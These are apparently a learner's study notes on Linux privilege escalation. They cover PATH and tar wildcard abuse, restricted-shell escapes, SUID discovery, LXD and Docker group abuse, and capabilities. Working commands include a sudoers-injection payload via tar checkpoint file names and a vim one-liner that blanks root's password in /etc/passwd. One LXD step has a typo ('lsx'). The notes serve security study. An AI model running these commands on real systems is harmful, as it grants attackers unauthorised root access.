```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```
> Other [[Privilege Escalation]] page
## Path Abuse
If we can modify a user's path, we could potentially run a malicious version of a binary if it is found earlier in the path. eg. `export PATH=.:${PATH}` will add the current directory.

## Wildcard Abuse
| Character | Significance                                                                                            |
| --------- | ------------------------------------------------------------------------------------------------------- |
| `*`       | Matches any number of characters in a file name                                                         |
| `?`       | Matches a single character                                                                              |
| `[ ]`     | Brackets enclose characters and can match any single one at the defined position                        |
| `~`       | Expands to the user's home directory or can have another username appended to refer to that user's home |
| `-`       | A hyphen within brackets will denote a range of characters                                              |
### Tar flags example
If we find a backup cron job (that runs every minute) that does something like:
```bash
*/01 * * * * cd /home/some-user && tar -zcf /home/some-user/backup.tar.gz *
```
We can abuse the `*` wildcard here by creating files with names of the CLI flags.
```bash
$ echo 'echo "some-user ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
$ echo "" > "--checkpoint-action=exec=sh root.sh"
$ echo "" > "--checkpoint=1"
```

## Escaping Restricted Shells
Restricted shells limit a user's ability to execute commands. They can limit what commands can be run and in what directories. Some examples include `rbash`, `rksh`, `rzsh` in linux and the `Restricted-access Shell` in windows.

Sometimes there are vectors we can use in these shells to run arbitrary commands and escape the shell. For examples:
Suppose a shell limits us to `ls -l`, we might be able to execute commands as arguments `ls -l $(pwd)`.

We could use features like *command substitution (using backticks)*, *command chaining (`;` `|`)*, *using environment variables to modify commands*, and *shell functions*.

List available commands with `compgen -c`.

## Special Permissions
### SETUID & SETGID
The `setuid` permissions allows a user to execute something as another user, typically with elevated privileges. This can be seen in `ls` with an `s`.
```bash
-rwsr-xr-x 1 root root 16728 Sep 1 19:06 /home/hr/payroll
```

The `setgid` allows you to run a binary as if you were part of the group that created them. These can all be found with:
```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```
> More info [here](https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits)

## GTFOBins
The [GTFOBins](https://gtfobins.github.io/) project is a curated list of binaries and scripts that can be used to bypass security restrictions. Each page details how a binary can be used to:
- Break out of restricted shells
- Elevate privileges
- Spawn reverse shells
- Transfer files

## Privileged Groups
### LXC / LXD
`LXD` is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group, we can abuse this as its a privileged group. We can make a privileged LXD container that mounts the host file system.
1. Ensure you are in the `lxd` group
2. Get a container image eg. Alpine
3. Start LXD : `lxd init` (*this [post](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04) can help with this*)
4. Import local image : `lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine`
5. Start a privileged container : `lxc init alpine [name] -c security.privileged=true`
6. Mount the host filesystem : `lsx config device add [name] mydev disk source=/ path=/mnt/root recursive=true`
7. Start the container : `lxc start [name]`
8. Exec into the container : `lxc exec [name] /bin/sh`

### Docker
The docker group is essentially root access to the file system without a password. Members can create new docker containers and mount the file system: `docker run -v /root:/mnt -it ubuntu`

### Disk
Users in the `disk` group have full access to any devices contained within `/dev`, such as `/dev/sda1`, which is typically the main device. An attacker with these privileges can use `debugfs` to access the entire filesystem with root access.

### ADM
The `adm` group is able to read all logs in `/var/log`, this could lead to sensitive information disclosure.

## Capabilities
Linux capabilities are a security feature that allows the OS to give specific privileges to processes. We can sometimes grant capabilities to processes that aren't adequately sandboxed or isolated, allowing for privileges to be escalated.

Ubuntu has the `setcap` command for setting capabilities for an executable.
```bash
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

Some useful capabilities are:

| Capability             | Description                                                                                                                                                   |
| ---------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `cap_sys_admin`        | Perform admin actions such as **modifying system files or system settings**                                                                                   |
| `cap_sys_chroot`       | Change the root directory for the current process, **access files and directories**                                                                           |
| `cap_sys_ptrace`       | Can attach to and debug other processes, potentially allowing for the **interception of sensitive information or modify the behaviour of the other process**. |
| `cap_sys_nice`         | Raise or lower the priority of processes, **could gain access to resources that were restricted**                                                             |
| `cap_sys_time`         | Can modify system clock, potentially allowing it to **manipulate timestamps or cause other processes to behave in unexpected ways**                           |
| `cap_sys_resource`     | Can modify system resource limits, such as max open file descriptors, or max memory allocation                                                                |
| `cap_sys_module`       | Allows for loading and unloading kernel modules, potentially allowing **modification of OS behaviours or revealing sensitive information**                    |
| `cap_net_bind_service` | Allows binding to network ports, potentially allowing it to **gain access to sensitive information or perform unauthorised actions**                          |
| `cap_setuid`           | Allows a process to set its effective user ID, this includes `root`                                                                                           |
| `cap_setgid`           | Allows the process to set its effective group ID, this includes the `root` group                                                                              |
| `cap_dac_override`     | Allows bypassing of file read, write, and execute permission checks                                                                                           |
When setting values with `setcap` we need to specify the capability as well as the value to set it too

| Capability Values | Description                                                                                                                                                                                                                                                      |
| ----------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `=`               | Sets the specified capability for the executable but does not grant any privileges. This can be used to clear a previously set capability.                                                                                                                       |
| `+ep`             | Grants the effective and permitted privileges. This allows for the privileges the capability allows but not any others. The effective privilege grants them immediately, this is useful for applications that are not "capability-aware" and do not self-manage. |
| `+ei`             | Grants sufficient and inheritable privileges for the capability. This allows actions the capability allows but also allows any child processes to inherit the capability.                                                                                        |
| `+p`              | Grants the permitted privileges for the capability. Allows actions the capability allows but does not allow other actions.                                                                                                                                       |
Capabilities can be enumerated with:
```bash
getcap [binary]
```
```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```
> Tools like [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) will do this automatically

If we found a binary such as `vim` that has the `cap_dac_override=eip` capability, we could use it to modify a system file:
```bash
$ getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip

$ /usr/bin/vim.basic /etc/passwd
```
(*This can also be done in a non-interactive way*)
```bash
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
```
> This removes the password field making it so root has no password.